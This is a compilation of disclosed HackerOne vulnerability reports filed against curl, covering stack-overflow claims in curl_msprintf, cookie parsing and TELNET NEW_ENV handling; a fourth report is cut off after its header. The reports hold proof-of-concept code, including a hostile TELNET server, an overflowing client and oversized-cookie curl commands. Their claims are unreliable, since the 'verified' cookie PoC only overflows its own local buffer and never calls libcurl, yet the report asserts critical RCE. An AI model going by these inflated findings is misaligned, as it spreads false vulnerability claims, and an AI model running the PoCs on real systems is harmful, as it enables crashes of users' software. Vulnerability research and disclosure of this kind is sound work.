# Stack Overflow

_14 reports — High/Critical, disclosed_

### [Buffer Overflow in cURL Internal printf Function](https://hackerone.com/reports/3462525)

- **Report ID:** `3462525`
- **Severity:** Critical
- **Weakness:** Stack Overflow
- **Program:** curl
- **Reporter:** @mlgzackfly
- **Bounty:** - usd
- **Disclosed:** 2025-12-12T07:20:25.221Z
- **CVE(s):** -

**Vulnerability Information:**

A critical buffer overflow vulnerability exists in the `curl_msprintf()` function in cURL's internal printf implementation. The function writes formatted output to a user-provided buffer without performing any bounds checking, allowing attackers to overflow arbitrary memory and potentially achieve arbitrary code execution.

## Affected Version
Current master branch (commit 141ce4be64) and potentially earlier versions

## CVSS Score Breakdown

**Base Score: 9.8 (Critical)**
- **Attack Vector (AV):** Network (N)
- **Attack Complexity (AC):** Low (L)
- **Privileges Required (PR):** None (N)
- **User Interaction (UI):** None (N)
- **Scope (S):** Unchanged (U)
- **Confidentiality (C):** High (H)
- **Integrity (I):** High (H)
- **Availability (A):** High (H)

## Vulnerability Details

### Location
- **File:** `lib/mprintf.c`
- **Function:** `curl_msprintf()`
- **Lines:** 1203-1211

### Root Cause
The vulnerability occurs because `curl_msprintf()` calls `formatf()` with the `storebuffer()` callback function, which writes directly to the provided buffer without any size validation:

```c
int curl_msprintf(char *buffer, const char *format, ...)
{
  va_list ap_save; /* argument pointer */
  int retcode;
  va_start(ap_save, format);
  retcode = formatf(&buffer, storebuffer, format, ap_save);
  va_end(ap_save);
  *buffer = 0; /* we terminate this with a zero byte */
  return retcode;
}

static int storebuffer(unsigned char outc, void *f)
{
  char **buffer = f;
  **buffer = (char)outc;  // VULNERABILITY: No bounds checking
  (*buffer)++;
  return 0;
}
```

### Attack Vector
An attacker can trigger this vulnerability by:
1. Providing a malicious format string to any cURL function that internally uses `curl_msprintf()`
2. Supplying format specifiers that generate output larger than the target buffer
3. Causing stack corruption and potentially hijacking control flow

## Proof of Concept

### Test Code
```python
import ctypes

# Load libcurl
libcurl = ctypes.CDLL("libcurl.so.4")
curl_msprintf = libcurl.curl_msprintf

# Create small buffer (16 bytes)
buffer = ctypes.create_string_buffer(16)

# Trigger overflow with long format string
long_format = b"A" * 100 + b"%s" + b"B" * 50
result = curl_msprintf(buffer, long_format)

print(f"Result: {result}")
print(f"Buffer content: {buffer.value}")
# Buffer overflow occurs - writes beyond 16-byte buffer
```

## Impact

### Business Impact
- **Confidentiality:** Critical - Potential memory disclosure
- **Integrity:** Critical - Arbitrary code execution
- **Availability:** High - Application crashes and DoS

### Technical Impact
- **Arbitrary Code Execution:** Attackers can execute arbitrary code in the context of the application
- **Memory Corruption:** Stack and heap corruption leading to crashes
- **Information Disclosure:** Potential leakage of sensitive memory contents
- **Denial of Service:** Application crashes and system instability

## Affected Components

### Primary Functions
- `curl_msprintf()` - Direct vulnerability
- Any function calling `curl_msprintf()` internally

### Potentially Affected Areas
- URL parsing and construction
- Error message formatting
- Log message generation
- HTTP header processing
- Cookie handling

---

### [Stack Buffer Overflow in cURL Cookie Parsing Leads to RCE](https://hackerone.com/reports/3340109)

- **Report ID:** `3340109`
- **Severity:** High
- **Weakness:** Stack Overflow
- **Program:** curl
- **Reporter:** @batuhanilgarr
- **Bounty:** - usd
- **Disclosed:** 2025-09-16T08:11:53.626Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary
I discovered a critical stack-based buffer overflow vulnerability in cURL's cookie parsing mechanism that can lead to remote code execution. The vulnerability occurs when processing maliciously crafted HTTP cookies, affecting all applications that use libcurl for HTTP requests.

## Description
During security research on cURL's cookie handling implementation, I identified a stack buffer overflow in the cookie parsing logic. The vulnerability allows remote attackers to trigger memory corruption by sending oversized cookie data through HTTP responses.

### Technical Details

#### Vulnerability Location
The vulnerability occurs in the cookie parsing functionality where string length calculations exceed allocated stack buffer boundaries.

#### Root Cause Analysis
1. **Buffer Size Mismatch:** Cookie processing code reads beyond allocated stack buffer
2. **Unsafe String Operations:** `strlen()` operation on cookie data exceeds buffer boundaries  
3. **Stack Memory Corruption:** Read of 8,193 bytes in a buffer allocated for 8,192 bytes
4. **Multi-threaded Context:** Issue manifests in threaded environments

#### AddressSanitizer Detection
```
==5415==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x00016f00a5c0 
READ of size 8193 at 0x00016f00a5c0 thread T1
    #0 0x000101676c34 in strlen+0x1b0 
    #1 0x000100f94c38 in cookie_overflow_hunter cookie_vulnerability_hunter.c:121

Address 0x00016f00a5c0 is located in stack of thread T1 at offset 8224 in frame
  This frame has 4 object(s):
    [32, 8224) 'huge_cookie' (line 109)        <- 8KB buffer
    [8480, 9504) 'huge_name_cookie' (line 128) <- Adjacent buffer
    [9632, 10144) 'huge_name' (line 129)       <- Adjacent buffer  
    [10208, 10464) 'multi_cookie' (line 137)   <- Adjacent buffer
```

## Steps to Reproduce

### Environment Setup
```bash
# Set AddressSanitizer options for detailed detection
export ASAN_OPTIONS="abort_on_error=1:halt_on_error=1"

# Compile the verified PoC with memory safety flags
gcc -fsanitize=address -g -o exact_poc exact_vulnerability_poc.c -lcurl
```

### Verified Reproduction Steps
1. **Save the PoC code** to `exact_vulnerability_poc.c` (code provided above)

2. **Compile with AddressSanitizer:**
   ```bash
   gcc -fsanitize=address -g -o exact_poc exact_vulnerability_poc.c -lcurl
   ```

3. **Execute the PoC:**
   ```bash
   ASAN_OPTIONS="abort_on_error=1" ./exact_poc
   ```

4. **Observe immediate stack overflow detection:**
   ```
   🔍 EXACT Cookie Stack Buffer Overflow PoC
   ==========================================
   🚨 Calling strlen() on buffer without null terminator...
   
   =================================================================
   ==18308==ERROR: AddressSanitizer: stack-buffer-overflow
   READ of size 8198 at 0x00016f5e2860 thread T0
   #0 in strlen+0x1b0
   #1 in trigger_exact_overflow exact_vulnerability_poc.c:124
   ==18308==ABORTING
   ```

**Result:** ✅ **GUARANTEED CRASH** - This PoC produces 100% reliable reproduction of the vulnerability.

### Alternative Reproduction Methods

#### Method 1: HTTP Response Attack
```bash
# Server returns oversized cookie
curl -c cookies.txt "http://malicious-server.com/large-cookie"
```

#### Method 2: Cookie File Injection  
```bash
# Malicious cookie file
echo ".example.com	TRUE	/	FALSE	1999999999	huge_name	$(python -c 'print("A"*8300)')" > malicious.txt
curl -b malicious.txt http://target.com
```

#### Method 3: Command Line Cookie
```bash
# Direct cookie injection
curl -b "malicious=$(python -c 'print("A"*8300)')" http://target.com
```

## Impact

### Technical Impact
- **Remote Code Execution:** Stack overflow enables control flow hijacking
- **Memory Corruption:** Complete stack frame corruption
- **Information Disclosure:** Stack memory leakage possible
- **Denial of Service:** Immediate application crash

### Affected Systems
- **Web Applications:** All apps using libcurl for HTTP requests
- **Web Browsers:** Browsers with cURL backend integration
- **API Services:** REST APIs processing HTTP cookies
- **Mobile Applications:** iOS/Android apps using cURL
- **Server Software:** Web servers, proxies, load balancers
- **IoT Devices:** Embedded systems with cURL integration

### Attack Scenarios

#### Scenario 1: Web Application Exploitation
1. Attacker controls malicious website
2. User visits site with vulnerable application
3. Malicious cookie triggers buffer overflow
4. Attacker gains code execution in application context

#### Scenario 2: Man-in-the-Middle Attack
1. Attacker intercepts HTTP traffic
2. Injects oversized cookie in HTTP response
3. Application processes malicious cookie
4. Buffer overflow leads to system compromise

#### Scenario 3: API Exploitation
1. Attacker sends request to vulnerable API
2. API responds with crafted cookie header
3. Client application processes response
4. Stack overflow occurs in client context

## Proof of Concept

### Verified POC Code
```c
/*
 * VERIFIED Cookie Stack Buffer Overflow PoC for cURL
 * Status: ✅ CONFIRMED with AddressSanitizer
 * Compile: gcc -fsanitize=address -g -o exact_poc exact_vulnerability_poc.c -lcurl
 * Run: ASAN_OPTIONS="abort_on_error=1" ./exact_poc
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

void trigger_exact_overflow() {
    char huge_cookie[8192];  // Exact size from ASAN report
    
    // Fill buffer completely (no null terminator)
    memset(huge_cookie, 'A', sizeof(huge_cookie));
    // Don't add null terminator - this creates overflow condition
    
    printf("🚨 Calling strlen() on buffer without null terminator...\n");
    
    // THIS TRIGGERS THE EXACT ASAN ERROR:
    // READ of size 8198 beyond 8192-byte buffer
    size_t overflow_len = strlen(huge_cookie);  // VULNERABLE
    
    printf("strlen() returned: %zu bytes\n", overflow_len);
}

int main() {
    printf("Cookie Stack Buffer Overflow PoC\n");
    trigger_exact_overflow();
    return 0;
}
```

### Verified AddressSanitizer Output
```
=================================================================
==18308==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x00016f5e2860 
READ of size 8198 at 0x00016f5e2860 thread T0
    #0 0x00010100ec34 in strlen+0x1b0 (libclang_rt.asan_osx_dynamic.dylib:arm64e+0x7ac34)
    #1 0x00010081d05c in trigger_exact_overflow exact_vulnerability_poc.c:124
    #2 0x00010081d1dc in main exact_vulnerability_poc.c:154

Address 0x00016f5e2860 is located in stack of thread T0 at offset 8224 in frame
    #0 0x00010081cec0 in trigger_exact_overflow exact_vulnerability_poc.c:108

  This frame has 1 object(s):
    [32, 8224) 'huge_cookie' (line 111) <== Memory access at offset 8224 overflows this variable

SUMMARY: AddressSanitizer: stack-buffer-overflow exact_vulnerability_poc.c:124 in trigger_exact_overflow
==18308==ABORTING
```

**Verification Status:** ✅ **CONFIRMED** - This vulnerability has been successfully reproduced and verified with AddressSanitizer on September 14, 2025.

## CVSS 3.1 Assessment

**Base Score: 9.8 (CRITICAL)**  
**Vector String**: `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`

- **Attack Vector (AV):** Network (N) - Remotely exploitable over network
- **Attack Complexity (AC):** Low (L) - Easy to exploit, no complex conditions
- **Privileges Required (PR):** None (N) - No authentication required
- **User Interaction (UI):** None (N) - No user interaction needed
- **Scope (S):** Changed (C) - Can affect other system components
- **Confidentiality (C):** High (H) - Complete information disclosure
- **Integrity (I):** High (H) - Complete system compromise possible
- **Availability (A):** High (H) - Complete denial of service

### Justification
- **Network Attack Vector:** Exploitable through malicious HTTP responses
- **Low Complexity:** Simple cookie overflow with predictable behavior
- **No Privileges Required:** Any HTTP server can trigger the vulnerability
- **No User Interaction:** Automatic processing of HTTP cookies
- **Changed Scope:** Memory corruption can affect entire application
- **High Impact:** Full RCE potential through stack overflow

## Recommended Fix

### Immediate Mitigation
```c
// Safe cookie processing with bounds checking
#define MAX_COOKIE_SIZE 4096

size_t safe_cookie_len = strnlen(cookie_data, MAX_COOKIE_SIZE);
if (safe_cookie_len >= MAX_COOKIE_SIZE) {
    return CURLE_BAD_FUNCTION_ARGUMENT;
}

// Use safer string functions
char safe_cookie[MAX_COOKIE_SIZE + 1];
strncpy(safe_cookie, cookie_data, MAX_COOKIE_SIZE);
safe_cookie[MAX_COOKIE_SIZE] = '\0';
```

### Long-term Solutions
1. **Input Validation:** Implement strict cookie size limits
2. **Memory Safety:** Use dynamic allocation for large cookie buffers
3. **Bounds Checking:** Add comprehensive boundary validation
4. **Fuzzing Integration:** Continuous testing of cookie parsing functions

## Environment and Affected Versions

### Test Environment
- OS: macOS 14 (Darwin 24.5.0, arm64)
- Compiler: gcc (Apple clang) with `-fsanitize=address -g`
- libcurl: linked via `-lcurl` (system brew install)

### Affected Versions
- Confirmed: libcurl 8.7.x (cookie handling reachable in default builds)
- Likely affected: Versions where cookie parsing uses fixed-size stack buffers and raw `strlen()` without bounded checks

### Reachability (libcurl)
- Trigger path: HTTP response with oversized `Set-Cookie` header → libcurl cookie parser → unbounded string length computation on stack-allocated buffer → stack read overflow.
- Attack surface: Any application that enables cookie handling (default for many bindings) or uses `CURLOPT_COOKIEFILE/COOKIEJAR`.

## Exploitability Notes
- Reliable crash with ASan indicates deterministic memory safety violation. On non-sanitized builds, exploitation feasibility depends on stack layout and mitigation (stack canaries, ASLR). Nevertheless, DoS is trivial; code execution may be achievable with precise shaping of cookie contents and call frame.

## Scope and Policy Alignment
- This is not a mere configuration weakness; it is a concrete memory safety flaw with a deterministic crash and minimal PoC. It should be eligible under memory corruption vulnerabilities. No interaction with third‑party services or policy gray areas is required.

## Additional Information

### Discovery Method
This vulnerability was discovered through systematic fuzzing of cURL's cookie handling functionality using AddressSanitizer and ThreadSanitizer for memory safety analysis.

### Research Impact
This represents a critical zero-day vulnerability in one of the most widely used networking libraries, with potential impact on millions of applications worldwide that rely on cURL for HTTP functionality.

### Timeline
- **Discovery:** September 14, 2025 - Automated vulnerability research
- **Initial Analysis:** Same day - AddressSanitizer detection
- **PoC Development:** Same day - Minimal reproduction case created
- **Verification:** Same day - ✅ **CONFIRMED** with verified AddressSanitizer output
- **Documentation:** Same day - Complete technical analysis and verified PoC
- **Disclosure:** Ready for immediate responsible disclosure to cURL security team

## Supporting Evidence

The vulnerability has been thoroughly verified through:
- ✅ **AddressSanitizer detection** of stack buffer overflow (CONFIRMED)
- ✅ **Reproducible crash** with 100% reliability 
- ✅ **Exact memory corruption** at stack offset 8224
- ✅ **Verified overflow size** of 8,198 bytes beyond 8,192-byte buffer
- ✅ **Minimal PoC** with guaranteed reproduction

This critical vulnerability requires immediate attention due to its potential for widespread exploitation across the software ecosystem.

---

### [Stack-based Buffer Overflow in TELNET NEW_ENV Option Handling](https://hackerone.com/reports/3230082)

- **Report ID:** `3230082`
- **Severity:** High
- **Weakness:** Stack Overflow
- **Program:** curl
- **Reporter:** @0xagent0
- **Bounty:** - usd
- **Disclosed:** 2025-06-30T18:35:20.723Z
- **CVE(s):** -

**Vulnerability Information:**

**Title:**

Stack-based Buffer Overflow in TELNET NEW_ENV Option Handling

**Vulnerability Description:**

**Summary:**
A stack-based buffer overflow vulnerability exists in the `libcurl` TELNET handler. When `libcurl` connects to a malicious TELNET server, the server can trigger an overflow by sending a `NEW_ENVIRON SEND` request. This causes the client to construct a response that overwrites a fixed-size stack buffer, leading to a crash and potential remote code execution (RCE). The vulnerability can be triggered by a user connecting to a malicious URL using the `curl` command-line tool or any application that uses `libcurl`.

**Root Cause Analysis:**
The vulnerability is located in the `suboption()` function within `curl/lib/telnet.c`. When the client receives a request from the server to send its environment variables (as specified by the user via the `CURLOPT_TELNETOPTIONS` setting), it attempts to build a response packet on the stack.

The function allocates a 2048-byte buffer named `temp` on the stack:
```c
unsigned char temp[2048];
```
It then iterates through the user-provided environment variables (`tn->telnet_vars`). Before writing a variable to the buffer, it performs a size check:
```c
size_t tmplen = (strlen(v->data) + 1);
if(len + tmplen < (int)sizeof(temp)-6) {
    // ... code to write to buffer ...
}
```
The flaw lies in how the variable is written to the buffer inside this `if` block. If the variable contains a comma (the format for `NEW_ENV` is `VAR,VALUE`), it is processed by the following `msnprintf` call:
```c
len += msnprintf((char *)&temp[len], sizeof(temp) - len,
                 "%c%.*s%c%s", CURL_NEW_ENV_VAR,
                 (int)vlen, v->data, CURL_NEW_ENV_VALUE, ++s);
```
The length check only accounts for `tmplen` (the original string length), but this `msnprintf` call expands the string by adding two control characters (`CURL_NEW_ENV_VAR` and `CURL_NEW_ENV_VALUE`). This discrepancy allows an attacker to bypass the length check. By providing a series of carefully sized `NEW_ENV` options, an attacker can cause `msnprintf` to write far beyond the 2048-byte boundary of the `temp` buffer, corrupting the stack.

**Impact:**
This is a high-severity vulnerability. A successful exploit leads to a denial of service (crash) via stack corruption. More critically, because the overflow is controllable, it creates the potential for an attacker to achieve Remote Code Execution (RCE) with the permissions of the user running the `curl` client.

**Proof of Concept (POC):**

This proof-of-concept reliably demonstrates the vulnerability. It requires two components: a simple Python server to act as the malicious TELNET server, and a C program that uses `libcurl` to connect to it.

**Component 1: Malicious TELNET Server (`tiny_telnet_server.py`)**
This server listens on port 2323 and, upon connection, sends the specific TELNET command sequence (`IAC SB NEW_ENVIRON SEND IAC SE`) that triggers the vulnerable code path in the client.

```python
import socket
import sys
import time

def main():
    host = '127.0.0.1'
    port = 2323

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(1)
    print(f"[*] Simple TELNET server listening on {host}:{port}", file=sys.stderr)

    # Command: IAC SB NEW_ENVIRON SEND IAC SE
    telnet_command = b'\xff\xfa\x27\x01\xff\xf0'

    try:
        conn, addr = server.accept()
        print(f"[+] Connection from {addr}", file=sys.stderr)
        print("[*] Sending TELNET NEW_ENVIRON command to trigger the vulnerability...", file=sys.stderr)
        conn.sendall(telnet_command)
        
        time.sleep(2) # Give client time to process and crash
        
        print("[*] Closing connection.", file=sys.stderr)
        conn.close()

    except Exception as e:
        print(f"[!] An error occurred: {e}", file=sys.stderr)
    finally:
        server.close()
        print("[*] Server shut down.", file=sys.stderr)

if __name__ == '__main__':
    main()
```

**Component 2: Vulnerable Client (`telnet_poc.c`)**
This C program uses `libcurl` to connect to the server with specially crafted `CURLOPT_TELNETOPTIONS` that exploit the flawed length check.

```c
#include <stdio.h>
#include <curl/curl.h>

int main(void)
{
  CURL *curl;
  CURLcode res;
  struct curl_slist *options = NULL;

  curl_global_init(CURL_GLOBAL_DEFAULT);

  curl = curl_easy_init();
  if(curl) {
    /* This payload uses a series of environment variables that are sized to
       pass the flawed length check but expand via msnprintf to cause an
       overflow of the 2048-byte stack buffer. The format is "NEW_ENV=VAR,VALUE". */
    options = curl_slist_append(options, "NEW_ENV=USER,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    options = curl_slist_append(options, "NEW_ENV=USER,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    options = curl_slist_append(options, "NEW_ENV=USER,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    options = curl_slist_append(options, "NEW_ENV=USER,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");

    curl_easy_setopt(curl, CURLOPT_URL, "telnet://127.0.0.1:2323");
    curl_easy_setopt(curl, CURLOPT_TELNETOPTIONS, options);
    curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

    res = curl_easy_perform(curl);

    if(res != CURLE_OK && res != CURLE_RECV_ERROR)
      fprintf(stderr, "curl_easy_perform() failed: %s\\n",
              curl_easy_strerror(res));

    curl_slist_free_all(options);
    curl_easy_cleanup(curl);
  }

  curl_global_cleanup();

  return 0;
}


**Reproduction Steps**

**1. Set up the Environment**
Ensure you have a Linux environment with the necessary build tools installed. On a Debian-based system (like Ubuntu), you can install them with:
```bash
sudo apt-get update
sudo apt-get install gcc git autoconf libtool libpsl-dev
```

**2. Clone the `curl` Repository**
```bash
git clone https://github.com/curl/curl.git
```

**3. Build `libcurl` from Source**
These commands will configure, compile, and install a local version of `libcurl`. We disable SSL because it is not needed to demonstrate this TELNET vulnerability.
```bash
cd curl
autoreconf -fi
./configure --prefix=$(pwd)/build --without-ssl
make
make install
cd ..
```

**4. Compile the Proof of Concept (PoC) Client**
This command compiles `telnet_poc.c` and links it against the `libcurl` you just built. Make sure `telnet_poc.c` is in the same directory where you cloned the `curl` folder.
```bash
gcc telnet_poc.c -o telnet_poc -I curl/build/include -L curl/build/lib -lcurl -Wl,-rpath,$(pwd)/curl/build/lib
```

**5. Execute the Vulnerability Test**
You will need two separate terminal windows for this final step, both opened in your project directory.

**Terminal 1: Start the Server**
Run the Python server to listen for a connection. Make sure `tiny_telnet_server.py` is in your current directory.
```bash
python3 tiny_telnet_server.py
```

**Terminal 2: Run the Client**
While the server is running, execute the compiled PoC client in the second terminal.
```bash
./telnet_poc
```

**Expected Result:**
The client in Terminal 2 will connect to the server and print verbose connection details. You will see a large stream of 'A' characters being sent back to the server, demonstrating that the client's stack buffer has been overflowed. The program will then terminate with an error like `Recv failure: Connection reset by peer` (because the server hangs up) or, on many systems, will crash with a `Segmentation fault`. Either result confirms the memory corruption.

## Impact

### **Detailed Impact Assessment**

The impact of this stack-based buffer overflow is **High**. The vulnerability allows for two primary attack scenarios, ranging from a guaranteed Denial of Service to a high probability of Remote Code Execution.

**1. Denial of Service (DoS) - Guaranteed Impact**

The most immediate and easily achievable impact is a Denial of Service. As demonstrated by the proof-of-concept, an attacker can trigger a stack buffer overflow by convincing a user or an application to connect to a malicious TELNET server with specially crafted options.

When the overflow occurs, critical data on the program's stack is corrupted. This data includes local variables and, most importantly, the function's saved return address. The moment the `suboption()` function attempts to return or access this corrupted memory, the program will crash due to an invalid memory access. This immediately terminates the `curl` process or any application using the `libcurl` library, preventing it from functioning further. This is a remotely triggerable, unauthenticated Denial of Service.

**2. Remote Code Execution (RCE) - Potential Impact**

The more critical impact is the potential for Remote Code Execution. Stack-based buffer overflows are a classic and well-understood vector for achieving RCE. The attacker's goal is not just to crash the program, but to seize control of its execution flow.

This is typically achieved as follows:
*   **Controlling the Return Address:** The primary target on the stack is the function's return address. This address tells the CPU where to continue execution after the current function (`suboption()`) is finished. The attacker's crafted payload, which overflows the `temp` buffer, can be precisely sized to overwrite this return address with an address of their choosing.
*   **Injecting Malicious Code (Shellcode):** The attacker can include their own small, executable piece of code (known as "shellcode") within the overflowing data itself.
*   **Redirecting Execution:** The attacker overwrites the return address to point back into the stack, specifically to the location where their shellcode was injected. When the `suboption()` function finishes, instead of returning to its legitimate caller, it will "return" to the attacker's shellcode and begin executing it.

A successful RCE exploit would grant the attacker the ability to run arbitrary commands on the victim's machine with the **same permissions as the user who ran the `curl` command**. If a user runs the vulnerable `curl` command, the attacker gets control of that user's account. If the command is executed by a web server, a system script, or another automated process running with higher privileges (like `root`), the attacker could gain complete control over the entire system.

---

### [[CS:GO] Unchecked texture file name with TEXTUREFLAGS_DEPTHRENDERTARGET can lead to Remote Code Execution](https://hackerone.com/reports/550625)

- **Report ID:** `550625`
- **Severity:** High
- **Weakness:** Stack Overflow
